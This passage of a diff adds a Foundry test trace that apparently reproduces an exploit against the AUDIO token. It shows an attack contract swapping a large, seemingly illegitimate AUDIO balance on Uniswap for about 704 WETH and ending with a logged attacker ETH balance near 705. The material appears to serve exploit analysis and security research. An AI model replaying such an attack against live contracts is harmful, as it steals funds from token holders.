+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 9999999999999981435502180000000000264459 [9.999e39])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xa177ad5b1609a4e783625b46e3ee407279131ff23903962d9c5ce8a1440867a5: 0x0000000000000000000000000000000000000000000f5b2f71812d138f71f6f5 → 0
+    │   │   │   │   @ 0x21fea950f8a819253c7ad63ca7c655d3edcbef58bdff2397636d1b54ae9bbca0: 0x00000000000000000000000000000000000000000002f458b14dfbb2b6eb72e8 → 0x000000000000000000000000000000000000000000124f8822cf28c6465d69dd
+    │   │   │   │   @ 0x16eb9c120c2a5fa294c01611a42bfb5ab7fdaf8fb7c9f00667f16c1b7e5ae708: 0x0000000000000000000000000000001d6329f1c35ca4bfabb9f5610000000000 → 0x0000000000000000000000000000001d6329f1c35c95647c487433ec708e090b
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [65327] 0xC730EF0f4973DA9cC0aB8Ab291890D3e77f58F79::swap(0, 704177543861243828018 [7.041e20], UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 0x)
+    │   │   ├─ [29962] WETH9::transfer(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 704177543861243828018 [7.041e20])
+    │   │   │   ├─ emit Transfer(from: 0xC730EF0f4973DA9cC0aB8Ab291890D3e77f58F79, to: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 704177543861243828018 [7.041e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xfb19a963956c9cb662dd3ae48988c4b90766df71ea130109840abe0a1b23dba8: 0 → 0x0000000000000000000000000000000000000000000000262c6d313fd07d5732
+    │   │   │   │   @ 0xac724077ac461b0e0e6ab072ce58a2f59fa67b4ab666a8ce200a01d287d38558: 0x00000000000000000000000000000000000000000000002d8a43ddc153394494 → 0x0000000000000000000000000000000000000000000000075dd6ac8182bbed62
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1008] AUDIO::balanceOf(0xC730EF0f4973DA9cC0aB8Ab291890D3e77f58F79) [staticcall]
+    │   │   │   ├─ [510] 0x22A9CCfdd10382D9cD18cA4437ff375bd7A87BBd::balanceOf(0xC730EF0f4973DA9cC0aB8Ab291890D3e77f58F79) [delegatecall]
+    │   │   │   │   └─ ← [Return] 22136242970672401133431261 [2.213e25]
+    │   │   │   └─ ← [Return] 22136242970672401133431261 [2.213e25]
+    │   │   ├─ [534] WETH9::balanceOf(0xC730EF0f4973DA9cC0aB8Ab291890D3e77f58F79) [staticcall]
+    │   │   │   └─ ← [Return] 135888990078754352482 [1.358e20]
+    │   │   ├─ emit Sync(reserve0: 22136242970672401133431261 [2.213e25], reserve1: 135888990078754352482 [1.358e20])
+    │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 18564497819999999999735541 [1.856e25], amount1In: 0, amount0Out: 0, amount1Out: 704177543861243828018 [7.041e20], to: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D])
+    │   │   ├─  storage changes:
+    │   │   │   @ 8: 0x62dc787f00000000002d8a43ddc15339449400000002f458b14dfbb2b6eb72e8 → 0x62dc7fbc0000000000075dd6ac8182bbed62000000124f8822cf28c6465d69dd
+    │   │   │   @ 9: 0x00000000000000000000000000000000623471bf8e427c1574bf5ddf87645ca4 → 0x000000000000000000000000000000006234e1518d819f7ca83efde5abcbed96
+    │   │   │   @ 10: 0x00000000000000000000000000249b9162cc284e89f58577903baf381dd17d5f → 0x00000000000000000000000000249c099a17d882989ae75640fb1b03acfd2a8c
+    │   │   └─ ← [Stop]
+    │   ├─ [9223] WETH9::withdraw(704177543861243828018 [7.041e20])
+    │   │   ├─ [83] UniswapV2Router02::receive{value: 704177543861243828018}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit Withdrawal(src: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], wad: 704177543861243828018 [7.041e20])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xfb19a963956c9cb662dd3ae48988c4b90766df71ea130109840abe0a1b23dba8: 0x0000000000000000000000000000000000000000000000262c6d313fd07d5732 → 0
+    │   │   └─ ← [Stop]
+    │   ├─ [0] 0xa0c7BD318D69424603CBf91e9969870F21B8ab4c::fallback{value: 704177543861243828018}()
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] [18564497819999999999735541 [1.856e25], 704177543861243828018 [7.041e20]]
+    ├─ [0] console::log("-------------------- End --------------------") [staticcall]
+    │   └─ ← [Stop]
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance", val: 705095181359677355662 [7.05e20], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 28.80s (27.44s CPU time)
+
+Ran 1 test suite in 33.50s (28.80s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
